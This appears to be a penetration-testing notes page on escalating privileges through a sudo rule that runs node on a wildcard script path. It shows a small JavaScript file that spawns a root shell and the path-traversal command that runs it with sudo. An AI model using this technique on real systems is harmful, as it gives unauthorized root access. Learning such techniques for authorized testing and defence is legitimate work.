---
title: Sudo Path Traversal Privilege Escalation
description: If some sudo command receives a file path, we might escalate to privileges using path traversal.
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

## Investigation

```sh
sudo -l

(ALL) /usr/bin/node /usr/local/scripts/*.js
```

If the file path uses wildcards, we may execute arbitrary files.  
In short, we can refer to files in different directories which the system owner unintended.

<br />

## Exploitation

Assume we can execute ‘node’ command as root and js file.  
Create the **“test.js”** under **/tmp**, which spawns a root shell after executing **‘node’** command.

```jsx
// /tmp/test.js
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```

Now run **‘node’** command as root. We can pass the file using path traversal.

```jsx
sudo /usr/bin/node /usr/local/scripts/../../../tmp/test.js
```